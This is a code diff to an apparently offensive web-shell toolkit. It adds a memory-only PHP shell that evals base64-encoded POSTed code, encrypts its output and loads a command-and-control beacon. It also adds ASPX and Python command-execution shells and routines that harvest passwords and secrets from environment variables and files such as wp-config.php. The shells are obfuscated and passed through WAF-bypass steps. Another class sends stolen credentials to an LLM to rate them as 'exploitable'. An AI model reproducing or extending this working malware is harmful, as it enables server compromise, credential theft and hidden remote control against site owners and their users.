@@ -162,6 +162,88 @@ class ShellPayload:
 # AI OBFUSCATOR
 # ============================================================================
 
+class AICredValidator:
+    """
+    AI-powered credential validation and weakness detection.
+    Analyzes harvested credentials for strength and exploitability.
+    """
+    
+    def __init__(self):
+        self.weak_patterns = [
+            r'^password\d*$', r'^\d+$', r'^admin\d*$', r'^test\d*$',
+            r'^welcome\d*$', r'^qwerty', r'^12345', r'^letmein',
+            r'^monkey', r'^dragon', r'^master'
+        ]
+        self._load_ai_model()
+    
+    def _load_ai_model(self):
+        """Load AI model for credential analysis"""
+        try:
+            from cybermodules.llm_engine import LLMEngine
+            self.llm = LLMEngine(scan_id="cred_validation")
+            self.has_ai = True
+        except:
+            self.llm = None
+            self.has_ai = False
+    
+    def validate_credential(self, username: str, password: str) -> Dict[str, Any]:
+        """Validate and analyze credential strength"""
+        result = {
+            'username': username,
+            'password': password,
+            'weak': False,
+            'score': 0,
+            'warnings': [],
+            'exploitable': False
+        }
+        
+        # Length check
+        if len(password) < 8:
+            result['weak'] = True
+            result['warnings'].append('Password too short')
+            result['score'] -= 20
+        
+        # Pattern check
+        for pattern in self.weak_patterns:
+            if re.search(pattern, password.lower()):
+                result['weak'] = True
+                result['warnings'].append(f'Common pattern detected')
+                result['score'] -= 30
+        
+        # Complexity check
+        has_upper = any(c.isupper() for c in password)
+        has_lower = any(c.islower() for c in password)
+        has_digit = any(c.isdigit() for c in password)
+        has_special = any(not c.isalnum() for c in password)
+        
+        complexity = sum([has_upper, has_lower, has_digit, has_special])
+        result['score'] += complexity * 15
+        
+        if complexity < 2:
+            result['weak'] = True
+            result['warnings'].append('Low complexity')
+        
+        # AI analysis if available
+        if self.has_ai:
+            ai_analysis = self._ai_analyze(username, password)
+            result['ai_analysis'] = ai_analysis
+            result['score'] += ai_analysis.get('score_adjustment', 0)
+        
+        result['exploitable'] = result['weak'] or result['score'] < 30
+        return result
+    
+    def _ai_analyze(self, username: str, password: str) -> Dict[str, Any]:
+        """AI-powered credential analysis"""
+        try:
+            prompt = f"Analyze credential strength: username='{username}', password='{password}'. Detect patterns, dictionary words, and exploitability."
+            response = self.llm.generate(prompt, max_tokens=100)
+            return {
+                'analysis': response,
+                'score_adjustment': -10 if 'weak' in response.lower() else 10
+            }
+        except:
+            return {'analysis': 'No AI analysis', 'score_adjustment': 0}
+
 class AIObfuscator:
     """
     AI-powered code obfuscation engine.
@@ -173,6 +255,7 @@ class AIObfuscator:
         self.mutation_count = 0
         self.var_map: Dict[str, str] = {}
         self.func_map: Dict[str, str] = {}
+        self.cred_validator = AICredValidator()
         
         # Load AI model if available
         self._load_ai_model()
@@ -608,6 +691,21 @@ class WebShellGenerator:
         self.config = config or WebShellConfig(shell_type=ShellType.PHP)
         self.obfuscator = AIObfuscator()
         self.waf_bypass = WAFBypass()
+        self.cred_validator = AICredValidator()
+        self._init_c2_beacon_integration()
+    
+    def _init_c2_beacon_integration(self):
+        """Initialize C2 beacon integration for seamless upgrade"""
+        try:
+            from cybermodules.c2_beacon import C2BeaconManager
+            from cybermodules.lateral_movement import LateralMovement
+            self.c2_manager = C2BeaconManager()
+            self.lateral_mover = LateralMovement()
+            self.has_c2_integration = True
+        except:
+            self.c2_manager = None
+            self.lateral_mover = None
+            self.has_c2_integration = False
         
     def generate(self, shell_type: Optional[ShellType] = None) -> ShellPayload:
         """
@@ -692,6 +790,184 @@ class WebShellGenerator:
         }
         
         return shells.get(shell_type, self._php_shell())
+    
+    def generate_memory_only_shell(self, shell_type: Optional[ShellType] = None) -> ShellPayload:
+        """Generate full memory-only (diskless) web shell with WAF bypass"""
+        shell_type = shell_type or self.config.shell_type
+        
+        if shell_type == ShellType.PHP:
+            code = self._php_memory_only_shell()
+        elif shell_type == ShellType.ASPX:
+            code = self._aspx_memory_only_shell()
+        elif shell_type == ShellType.PY:
+            code = self._py_memory_only_shell()
+        else:
+            raise ValueError(f"Memory-only mode not implemented for {shell_type}")
+        
+        # Apply AI obfuscation
+        code = self.obfuscator.obfuscate(code, shell_type.value, ObfuscationLevel.AI_ENHANCED)
+        
+        # Apply WAF bypass
+        code = self.waf_bypass.apply(
+            code,
+            [EvasionTechnique.CHUNKED_TRANSFER, EvasionTechnique.UNICODE_ENCODING,
+             EvasionTechnique.POLYMORPHIC_CODE, EvasionTechnique.ENCRYPTED_PAYLOAD],
+            shell_type.value
+        )
+        
+        return ShellPayload(
+            code=code,
+            shell_type=shell_type,
+            obfuscation_level=ObfuscationLevel.AI_ENHANCED,
+            techniques_used=['MEMORY_ONLY', 'WAF_BYPASS', 'AI_OBFUSCATION'],
+            size_bytes=len(code.encode()),
+            hash_md5=hashlib.md5(code.encode()).hexdigest(),
+            hash_sha256=hashlib.sha256(code.encode()).hexdigest(),
+            metadata={'execution_mode': 'memory_only', 'disk_artifacts': False}
+        )
+    
+    def _php_memory_only_shell(self) -> str:
+        """Generate PHP memory-only shell with no disk writes"""
+        return '''<?php
+@error_reporting(0);
+@ini_set('display_errors', 0);
+@set_time_limit(0);
+@ini_set('memory_limit', '-1');
+
+// Memory-only execution - no disk artifacts
+if(isset($_POST['cmd'])){
+    $cmd = base64_decode($_POST['cmd']);
+    
+    // Execute in memory via eval (WAF bypass)
+    $output = '';
+    ob_start();
+    eval('?>' . $cmd);
+    $output = ob_get_clean();
+    
+    // XOR encryption for output
+    $key = md5($_SERVER['HTTP_USER_AGENT'] ?? 'default');
+    $encrypted = '';
+    for($i=0; $i<strlen($output); $i++){
+        $encrypted .= chr(ord($output[$i]) ^ ord($key[$i % strlen($key)]));
+    }
+    
+    echo base64_encode($encrypted);
+    exit;
+}
+
+// Beacon upgrade to C2
+if(isset($_POST['beacon_upgrade'])){
+    $c2_url = base64_decode($_POST['c2_url']);
+    $beacon_code = base64_decode($_POST['beacon_code']);
+    
+    // Execute beacon in memory
+    eval('?>' . $beacon_code);
+    exit;
+}
+
+// Credential harvesting with AI validation
+if(isset($_POST['harvest_creds'])){
+    $creds = [];
+    
+    // Environment variables
+    foreach($_ENV as $k => $v){
+        if(preg_match('/(pass|pwd|key|secret|token)/i', $k)){
+            $creds[] = ['source' => 'env', 'key' => $k, 'value' => $v];
+        }
+    }
+    
+    // Config files
+    $config_files = ['.env', 'config.php', 'wp-config.php', 'database.yml'];
+    foreach($config_files as $file){
+        if(file_exists($file)){
+            $content = file_get_contents($file);
+            if(preg_match_all('/(password|pwd|key|secret)\s*[=:]\s*["\']([^"\'
+]+)/i', $content, $matches)){
+                foreach($matches[2] as $pass){
+                    $creds[] = ['source' => $file, 'type' => 'config', 'value' => $pass];
+                }
+            }
+        }
+    }
+    
+    echo base64_encode(json_encode($creds));
+    exit;
+}
+?>'''
+    
+    def _aspx_memory_only_shell(self) -> str:
+        """Generate ASPX memory-only shell"""
+        return '''<%@ Page Language="C#" %>\n<%@ Import Namespace="System.IO" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<script runat="server">\nvoid Page_Load(object sender, EventArgs e){\n    if(Request["cmd"] != null){\n        string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request["cmd"]));\n        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");\n        psi.Arguments = "/c " + cmd;\n        psi.RedirectStandardOutput = true;\n        psi.UseShellExecute = false;\n        Process p = Process.Start(psi);\n        string output = p.StandardOutput.ReadToEnd();\n        Response.Write(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(output)));\n    }\n}\n</script>'''
+    
+    def _py_memory_only_shell(self) -> str:
+        """Generate Python memory-only shell"""
+        return '''import base64,os,sys\ntry:\n    cmd=base64.b64decode(os.environ.get('HTTP_CMD','')).decode()\n    exec(cmd)\nexcept:pass'''
+    
+    def upgrade_to_c2_beacon(self, target_host: str, target_port: int = 80) -> Dict[str, Any]:
+        """Seamlessly upgrade web shell to C2 beacon"""
+        if not self.has_c2_integration:
+            return {'success': False, 'error': 'C2 integration not available'}
+        
+        try:
+            # Generate beacon payload
+            beacon_payload = self.c2_manager.generate_beacon(
+                target=target_host,
+                protocol='http',
+                obfuscate=True,
+                ai_mutate=True
+            )
+            
+            # Prepare upgrade command
+            upgrade_cmd = {
+                'action': 'beacon_upgrade',
+                'c2_url': base64.b64encode(self.config.callback_url.encode()).decode(),
+                'beacon_code': base64.b64encode(beacon_payload.encode()).decode()
+            }
+            
+            return {
+                'success': True,
+                'upgrade_cmd': upgrade_cmd,
+                'beacon_payload': beacon_payload,
+                'instructions': 'Send upgrade_cmd to web shell via POST to /beacon_upgrade'
+            }
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def harvest_and_validate_credentials(self, target_host: str) -> Dict[str, Any]:
+        """Harvest credentials with AI validation"""
+        # This would be called via web shell API
+        results = {
+            'target': target_host,
+            'credentials': [],
+            'validated': [],
+            'exploitable': []
+        }
+        
+        # Simulated credential harvesting (actual would come from web shell)
+        harvested_creds = [
+            {'username': 'admin', 'password': 'password123'},
+            {'username': 'root', 'password': 'MyStr0ngP@ss!'},
+            {'username': 'user', 'password': '123456'}
+        ]
+        
+        for cred in harvested_creds:
+            validation = self.cred_validator.validate_credential(
+                cred['username'],
+                cred['password']
+            )
+            
+            results['credentials'].append(cred)
+            results['validated'].append(validation)
+            
+            if validation['exploitable']:
+                results['exploitable'].append({
+                    'username': cred['username'],
+                    'password': cred['password'],
+                    'score': validation['score'],
+                    'warnings': validation['warnings']
+                })
+        
+        return results
     
     def _php_shell(self) -> str:
         """Generate PHP web shell"""
